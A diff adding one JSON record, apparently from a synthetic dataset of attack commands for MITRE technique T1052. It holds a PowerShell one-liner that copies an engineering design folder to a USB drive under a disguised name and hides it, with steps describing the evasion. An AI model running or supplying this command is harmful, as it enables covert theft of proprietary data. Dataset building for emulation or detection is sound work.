@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=(Get-Volume | Where-Object {$_.DriveType -eq 'Removable' -and $_.DriveLetter} | Select-Object -First 1 -ExpandProperty DriveLetter)+':\\'; $dst=Join-Path $usb 'System Volume Data'; robocopy 'C:\\Engineering\\Designs' $dst /E /COPY:DAT /DCOPY:T /R:1 /W:1 /XJ /MT:8 > $null; attrib +h +s $dst",
+  "explanation": "Uses robocopy to mirror a directory to a hidden folder on the USB while preserving timestamps and data attributes.",
+  "rationale_steps": [
+    "Identify removable drive",
+    "Copy files with robust robocopy options to USB",
+    "Preserve metadata to reduce anomalies",
+    "Hide destination folder with system/hidden attributes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-b282912d-b60d4a21",
+  "source_prompt_hash": "b282912d",
+  "timestamp_utc": "2025-09-30T05:30:27.458223Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
